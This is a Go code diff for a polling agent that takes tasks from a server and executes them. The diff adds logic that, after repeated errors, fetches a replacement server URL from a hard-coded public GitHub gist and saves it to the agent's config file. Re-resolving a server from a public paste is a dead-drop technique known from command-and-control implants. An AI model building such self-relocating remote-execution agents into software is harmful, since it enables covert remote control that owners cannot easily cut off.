@@ -7,6 +7,9 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
 	"time"
 )
 
@@ -57,15 +60,33 @@ func (p *Poller) Run() {
 		}
 	}()
 
+	const maxConsecutiveErrors = 5
+	consecutiveErrors := 0
+
 	log.Printf("[AGENT] started. server=%s machine=%s wait=%ds", p.cfg.ServerURL, p.cfg.MachineID, p.cfg.PollWait)
 
 	for {
 		task, err := p.poll()
 		if err != nil {
-			log.Printf("[AGENT] poll error: %v", err)
+			consecutiveErrors++
+			log.Printf("[AGENT] poll error (%d/%d): %v", consecutiveErrors, maxConsecutiveErrors, err)
+
+			if consecutiveErrors >= maxConsecutiveErrors {
+				log.Printf("[AGENT] too many errors, discovering new tunnel URL...")
+				newURL := p.discoverURL()
+				if newURL != "" && newURL != p.cfg.ServerURL {
+					log.Printf("[AGENT] switching to new server: %s", newURL)
+					p.cfg.ServerURL = newURL
+					p.saveConfig()
+				}
+				consecutiveErrors = 0
+			}
+
 			time.Sleep(5 * time.Second)
 			continue
 		}
+
+		consecutiveErrors = 0
 
 		if task == nil {
 			continue
@@ -79,6 +100,45 @@ func (p *Poller) Run() {
 		log.Printf("[AGENT] executing task %s action=%s", task.TaskID, task.Action)
 		p.executeAndReport(task)
 	}
+}
+
+func (p *Poller) discoverURL() string {
+	const gistURL = "https://gist.githubusercontent.com/egzakutacno/0c3de11a3381ae878b09626b306d04d1/raw/tunnel-url.txt"
+
+	req, err := http.NewRequest("GET", gistURL, nil)
+	if err != nil {
+		return ""
+	}
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Printf("[AGENT] gist fetch error: %v", err)
+		return ""
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 512))
+	if err != nil {
+		return ""
+	}
+
+	url := strings.TrimSpace(string(body))
+	if strings.HasPrefix(url, "http") {
+		return url
+	}
+	return ""
+}
+
+func (p *Poller) saveConfig() {
+	data, err := json.MarshalIndent(p.cfg, "", "  ")
+	if err != nil {
+		return
+	}
+
+	exePath, _ := os.Executable()
+	configPath := filepath.Join(filepath.Dir(exePath), "agent.json")
+	os.WriteFile(configPath, data, 0644)
 }
 
 func (p *Poller) poll() (*Task, error) {
